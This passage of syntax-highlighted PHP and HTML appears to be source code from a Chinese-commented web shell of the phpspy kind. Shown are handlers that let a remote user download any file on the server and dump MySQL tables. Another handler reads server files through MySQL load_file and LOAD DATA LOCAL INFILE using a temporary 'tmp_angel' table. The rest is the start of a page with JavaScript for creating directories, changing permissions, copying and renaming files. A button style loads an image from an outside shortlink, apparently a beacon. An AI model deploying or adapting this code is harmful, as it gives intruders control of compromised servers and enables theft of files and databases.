}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'downfile'</span> &amp;&amp; $<span style="color: #ffcc66;">thefile</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!@<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">thefile</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">errmsg</span> = <span style="color: #66cccc;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fileinfo</span> = <span style="color: #cccccc; background-color: #2d2d2d;">pathinfo(</span>$<span style="color: #ffcc66;">thefile</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Content-type: application/x-'</span>.$<span style="color: #ffcc66;">fileinfo</span>[<span style="color: #66cccc;">'extension'</span>]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #ffcc66;">fileinfo</span>[<span style="color: #66cccc;">'basename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Content-Length: '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">thefile</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">readfile(</span>$<span style="color: #ffcc66;">thefile</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">doing</span> == <span style="color: #66cccc;">'backupmysql'</span> &amp;&amp; !$<span style="color: #ffcc66;">saveasfile</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">table</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">errmsg</span> =<span style="color: #66cccc;">'Please choose the table'</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>, $<span style="color: #ffcc66;">dbuser</span>, $<span style="color: #ffcc66;">dbpass</span>, $<span style="color: #ffcc66;">dbname</span>, $<span style="color: #ffcc66;">charset</span>, $<span style="color: #ffcc66;">dbp</span><span style="color: #ffcc66; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filename</span> = <span style="color: #cccccc; background-color: #2d2d2d;">basename(</span>$<span style="color: #ffcc66;">dbname</span>.<span style="color: #66cccc;">'.sql'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Content-type: application/unknown'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #ffcc66;">filename</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">table</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">k</span> =&gt; $<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">sqldumptable(</span>$<span style="color: #ffcc66;">v</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">mysql_close(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">doing</span>==<span style="color: #66cccc;">'mysqldown'</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">dbname</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">errmsg</span> = <span style="color: #66cccc;">'Please input dbname'</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mysqllink</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mydbconn(</span>$<span style="color: #ffcc66;">dbhost</span>, $<span style="color: #ffcc66;">dbuser</span>, $<span style="color: #ffcc66;">dbpass</span>, $<span style="color: #ffcc66;">dbname</span>, $<span style="color: #ffcc66;">charset</span>, $<span style="color: #ffcc66;">dbp</span><span style="color: #ffcc66; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">mysqldlfile</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">errmsg</span> = <span style="color: #66cccc;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"select load_file('$mysqldlfile');"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!$<span style="color: #ffcc66;">result</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"DROP TABLE IF EXISTS tmp_angel;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"LOAD DATA LOCAL INFILE '"</span>.<span style="color: #cccccc; background-color: #2d2d2d;">addslashes(</span>$<span style="color: #ffcc66;">mysqldlfile</span>).<span style="color: #66cccc;">"' INTO TA</span><span style="color: #66cccc; text-decoration: underline;">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"select content from tmp_angel"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"DROP TABLE tmp_angel"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">row</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_array(</span>$<span style="color: #ffcc66;">result</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">row</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">errmsg</span> = <span style="color: #66cccc;">'Load file failed '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">mysql_error(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fileinfo</span> = <span style="color: #cccccc; background-color: #2d2d2d;">pathinfo(</span>$<span style="color: #ffcc66;">mysqldlfile</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Content-type: application/x-'</span>.$<span style="color: #ffcc66;">fileinfo</span>[<span style="color: #66cccc;">'extension'</span>]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #ffcc66;">fileinfo</span>[<span style="color: #66cccc;">'b</span><span style="color: #66cccc; text-decoration: underline;">asename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">"Accept-Length: "</span>.<span style="color: #cccccc; background-color: #2d2d2d;">strlen(</span>$<span style="color: #ffcc66;">row</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>]));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">row</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #cc99cc;">?&gt;</span>
<span style="color: #6699cc;">&lt;html&gt;</span>
<span style="color: #6699cc;">&lt;head&gt;</span>
<span style="color: #6699cc;">&lt;meta</span> <span style="color: #f2777a; font-weight: bold;">http</span>-<span style="color: #f2777a; font-weight: bold;">equiv</span>=<span style="color: #66cccc;">"Content-Type"</span> <span style="color: #6699cc;">content=</span><span style="color: #66cccc;">"text/html; charset=gbk"</span><span style="color: #6699cc;">&gt;</span>
<span style="color: #6699cc;">&lt;title&gt;</span><span style="color: #cc99cc;">&lt;?php</span> <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">action</span>.<span style="color: #66cccc;">' - '</span>.$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'HTTP_HOST'</span>];<span style="color: #cc99cc;">?&gt;</span><span style="color: #6699cc;">&lt;/title&gt;</span>
<span style="color: #6699cc;">&lt;style</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"text/css"</span><span style="color: #6699cc;">&gt;</span>
<span style="color: #f2777a; font-weight: bold;">body</span>,<span style="color: #f2777a; font-weight: bold;">td</span>{<span style="color: #f2777a; font-weight: bold;">font</span>: <span style="color: #cccccc; background-color: #2d2d2d;">12</span>px <span style="color: #f2777a; font-weight: bold;">Arial</span>,<span style="color: #f2777a; font-weight: bold;">Tahoma</span>;<span style="color: #f2777a; font-weight: bold;">line</span>-<span style="color: #f2777a; font-weight: bold;">height</span>: <span style="color: #cccccc; background-color: #2d2d2d;">16</span>px;}
.<span style="color: #f2777a; font-weight: bold;">input</span>{<span style="color: #f2777a; font-weight: bold;">font</span>:<span style="color: #cccccc; background-color: #2d2d2d;">12</span>px <span style="color: #f2777a; font-weight: bold;">Arial</span>,<span style="color: #f2777a; font-weight: bold;">Tahoma</span>;<span style="color: #f2777a; font-weight: bold;">background</span>:<span style="color: #999999; font-style: italic;">#fff;border: 1px solid #666;padding:2px</span><span style="color: #999999; font-style: italic; text-decoration: underline;">;height:22px;}</span>
.<span style="color: #f2777a; font-weight: bold;">area</span>{<span style="color: #f2777a; font-weight: bold;">font</span>:<span style="color: #cccccc; background-color: #2d2d2d;">12</span>px <span style="color: #66cccc;">'Courier New'</span>, <span style="color: #f2777a; font-weight: bold;">Monospace</span>;<span style="color: #f2777a; font-weight: bold;">background</span>:<span style="color: #999999; font-style: italic;">#fff;border: 1px solid #666;</span><span style="color: #999999; font-style: italic; text-decoration: underline;">padding:2px;}</span>
.<span style="color: #f2777a; font-weight: bold;">bt</span> {<span style="color: #f2777a; font-weight: bold;">border</span>-<span style="color: #f2777a; font-weight: bold;">color</span>:<span style="color: #999999; font-style: italic;">#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#fff</span><span style="color: #999999; font-style: italic; text-decoration: underline;">fff;font:12px Arial,Tahoma;height:22px;}</span>
<span style="color: #f2777a; font-weight: bold;">a</span> {<span style="color: #f2777a; font-weight: bold;">color</span>: <span style="color: #999999; font-style: italic;">#00f;text-decoration:underline;}</span>
<span style="color: #f2777a; font-weight: bold;">a</span>:<span style="color: #f2777a; font-weight: bold;">hover</span>{<span style="color: #f2777a; font-weight: bold;">color</span>: <span style="color: #999999; font-style: italic;">#f00;text-decoration:none;}</span>
.<span style="color: #f2777a; font-weight: bold;">alt1</span> <span style="color: #f2777a; font-weight: bold;">td</span>{<span style="color: #f2777a; font-weight: bold;">border</span>-<span style="color: #f2777a; font-weight: bold;">top</span>:<span style="color: #cccccc; background-color: #2d2d2d;">1</span>px <span style="color: #f2777a; font-weight: bold;">solid</span> <span style="color: #999999; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f1f1</span><span style="color: #999999; font-style: italic; text-decoration: underline;">f1;padding:5px 15px 5px 5px;}</span>
.<span style="color: #f2777a; font-weight: bold;">alt2</span> <span style="color: #f2777a; font-weight: bold;">td</span>{<span style="color: #f2777a; font-weight: bold;">border</span>-<span style="color: #f2777a; font-weight: bold;">top</span>:<span style="color: #cccccc; background-color: #2d2d2d;">1</span>px <span style="color: #f2777a; font-weight: bold;">solid</span> <span style="color: #999999; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f9f9</span><span style="color: #999999; font-style: italic; text-decoration: underline;">f9;padding:5px 15px 5px 5px;}</span>
.<span style="color: #f2777a; font-weight: bold;">focus</span> <span style="color: #f2777a; font-weight: bold;">td</span>{<span style="color: #f2777a; font-weight: bold;">border</span>-<span style="color: #f2777a; font-weight: bold;">top</span>:<span style="color: #cccccc; background-color: #2d2d2d;">1</span>px <span style="color: #f2777a; font-weight: bold;">solid</span> <span style="color: #999999; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#fff</span><span style="color: #999999; font-style: italic; text-decoration: underline;">faa;padding:5px 15px 5px 5px;}</span>
.<span style="color: #f2777a; font-weight: bold;">head</span> <span style="color: #f2777a; font-weight: bold;">td</span>{<span style="color: #f2777a; font-weight: bold;">border</span>-<span style="color: #f2777a; font-weight: bold;">top</span>:<span style="color: #cccccc; background-color: #2d2d2d;">1</span>px <span style="color: #f2777a; font-weight: bold;">solid</span> <span style="color: #999999; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#e9e9</span><span style="color: #999999; font-style: italic; text-decoration: underline;">e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
.<span style="color: #f2777a; font-weight: bold;">head</span> <span style="color: #f2777a; font-weight: bold;">td</span> <span style="color: #f2777a; font-weight: bold;">span</span>{<span style="color: #f2777a; font-weight: bold;">font</span>-<span style="color: #f2777a; font-weight: bold;">weight</span>:<span style="color: #f2777a; font-weight: bold;">normal</span>;}
.<span style="color: #f2777a; font-weight: bold;">infolist</span> {<span style="color: #f2777a; font-weight: bold;">padding</span>:<span style="color: #cccccc; background-color: #2d2d2d;">10</span>px;<span style="color: #f2777a; font-weight: bold;">margin</span>:<span style="color: #cccccc; background-color: #2d2d2d;">10</span>px <span style="color: #cccccc; background-color: #2d2d2d;">0</span> <span style="color: #cccccc; background-color: #2d2d2d;">20</span>px <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;<span style="color: #f2777a; font-weight: bold;">background</span>:<span style="color: #999999; font-style: italic;">#F1F1F1;border:1px solid</span><span style="color: #999999; font-style: italic; text-decoration: underline;"> #ddd;}</span>
<span style="color: #f2777a; font-weight: bold;">form</span>{<span style="color: #f2777a; font-weight: bold;">margin</span>:<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;<span style="color: #f2777a; font-weight: bold;">padding</span>:<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;}
<span style="color: #f2777a; font-weight: bold;">h2</span>{<span style="color: #f2777a; font-weight: bold;">margin</span>:<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;<span style="color: #f2777a; font-weight: bold;">padding</span>:<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;<span style="color: #f2777a; font-weight: bold;">height</span>:<span style="color: #cccccc; background-color: #2d2d2d;">24</span>px;<span style="color: #f2777a; font-weight: bold;">line</span>-<span style="color: #f2777a; font-weight: bold;">height</span>:<span style="color: #cccccc; background-color: #2d2d2d;">24</span>px;<span style="color: #f2777a; font-weight: bold;">font</span>-<span style="color: #f2777a; font-weight: bold;">size</span>:<span style="color: #cccccc; background-color: #2d2d2d;">14</span>px;<span style="color: #f2777a; font-weight: bold;">color</span>:<span style="color: #999999; font-style: italic;">#5B686F;</span><span style="color: #999999; font-style: italic; text-decoration: underline;">}</span>
<span style="color: #f2777a; font-weight: bold;">ul</span>.<span style="color: #f2777a; font-weight: bold;">info</span> <span style="color: #f2777a; font-weight: bold;">li</span>{<span style="color: #f2777a; font-weight: bold;">margin</span>:<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;<span style="color: #f2777a; font-weight: bold;">color</span>:<span style="color: #999999; font-style: italic;">#444;line-height:24px;height:24px;}</span>
<span style="color: #f2777a; font-weight: bold;">u</span>{<span style="color: #f2777a; font-weight: bold;">text</span>-<span style="color: #f2777a; font-weight: bold;">decoration</span>: <span style="color: #f2777a; font-weight: bold;">none</span>;<span style="color: #f2777a; font-weight: bold;">color</span>:<span style="color: #999999; font-style: italic;">#777;float:left;display:block;width:150px;margin-r</span><span style="color: #999999; font-style: italic; text-decoration: underline;">ight:10px;}</span>
.<span style="color: #f2777a; font-weight: bold;">drives</span>{<span style="color: #f2777a; font-weight: bold;">padding</span>:<span style="color: #cccccc; background-color: #2d2d2d;">5</span>px;}
.<span style="color: #f2777a; font-weight: bold;">drives</span> <span style="color: #f2777a; font-weight: bold;">span</span> {<span style="color: #f2777a; font-weight: bold;">margin</span>:<span style="color: #f2777a; font-weight: bold;">auto</span> <span style="color: #cccccc; background-color: #2d2d2d;">7</span>px;}
<span style="color: #6699cc;">&lt;/style&gt;</span>
<span style="color: #6699cc;">&lt;script</span> <span style="color: #6699cc;">type=</span><span style="color: #66cccc;">"text/javascript"</span><span style="color: #6699cc;">&gt;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">CheckAll</span>(<span style="color: #f2777a; font-weight: bold;">form</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>(<span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">i</span>=<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;<span style="color: #f2777a; font-weight: bold;">i</span><span style="color: #6699cc;">&lt;form</span>.<span style="color: #f2777a; font-weight: bold;">elements</span>.<span style="color: #f2777a; font-weight: bold;">length</span>;<span style="color: #f2777a; font-weight: bold;">i</span>++) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">e</span> = <span style="color: #f2777a; font-weight: bold;">form</span>.<span style="color: #cccccc; background-color: #2d2d2d;">elements[</span><span style="color: #f2777a; font-weight: bold;">i</span>];
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">e</span>.<span style="color: #f2777a; font-weight: bold;">name</span> != <span style="color: #66cccc;">'chkall'</span>)
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">e</span>.<span style="color: #f2777a; font-weight: bold;">checked</span> = <span style="color: #f2777a; font-weight: bold;">form</span>.<span style="color: #f2777a; font-weight: bold;">chkall</span>.<span style="color: #f2777a; font-weight: bold;">checked</span>;
<span style="background-color: #515151;"> </span>   }
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">$</span>(<span style="color: #f2777a; font-weight: bold;">id</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #f2777a; font-weight: bold;">document</span>.<span style="color: #cccccc; background-color: #2d2d2d;">getElementById(</span><span style="color: #f2777a; font-weight: bold;">id</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">createdir</span>(){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">newdirname</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">newdirname</span> = <span style="color: #cccccc; background-color: #2d2d2d;">prompt(</span><span style="color: #66cccc;">'Please input the directory name:'</span>, <span style="color: #66cccc;">''</span>  );
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #f2777a; font-weight: bold;">newdirname</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'createdir'</span>).<span style="color: #f2777a; font-weight: bold;">newdirname</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">newdirname</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'createdir'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">fileperm</span>(<span style="color: #f2777a; font-weight: bold;">pfile</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">newperm</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">newperm</span> = <span style="color: #cccccc; background-color: #2d2d2d;">prompt(</span><span style="color: #66cccc;">'Current file:'</span>+<span style="color: #f2777a; font-weight: bold;">pfile</span>+<span style="color: #66cccc;">'\nPlease input new attribute:'</span>, <span style="color: #66cccc;">''</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #f2777a; font-weight: bold;">newperm</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'fileperm'</span>).<span style="color: #f2777a; font-weight: bold;">newperm</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">newperm</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'fileperm'</span>).<span style="color: #f2777a; font-weight: bold;">pfile</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">pfile</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'fileperm'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">copyfile</span>(<span style="color: #f2777a; font-weight: bold;">sname</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">tofile</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">tofile</span> = <span style="color: #cccccc; background-color: #2d2d2d;">prompt(</span><span style="color: #66cccc;">'Original file:'</span>+<span style="color: #f2777a; font-weight: bold;">sname</span>+<span style="color: #66cccc;">'\nPlease input object file (fullpath</span><span style="color: #66cccc; text-decoration: underline;">):'</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #f2777a; font-weight: bold;">tofile</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'copyfile'</span>).<span style="color: #f2777a; font-weight: bold;">tofile</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">tofile</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'copyfile'</span>).<span style="color: #f2777a; font-weight: bold;">sname</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">sname</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'copyfile'</span>).<span style="color: #cccccc; background-color: #2d2d2d;">submit(</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">rename</span>(<span style="color: #f2777a; font-weight: bold;">oldname</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">var</span> <span style="color: #f2777a; font-weight: bold;">newfilename</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #f2777a; font-weight: bold;">newfilename</span> = <span style="color: #cccccc; background-color: #2d2d2d;">prompt(</span><span style="color: #66cccc;">'Former file name:'</span>+<span style="color: #f2777a; font-weight: bold;">oldname</span>+<span style="color: #66cccc;">'\nPlease input new filenam</span><span style="color: #66cccc; text-decoration: underline;">e:'</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #f2777a; font-weight: bold;">newfilename</span>) <span style="color: #99cc99;">return</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">$(</span><span style="color: #66cccc;">'rename'</span>).<span style="color: #f2777a; font-weight: bold;">newfilename</span>.<span style="color: #f2777a; font-weight: bold;">value</span>=<span style="color: #f2777a; font-weight: bold;">newfilename</span>;
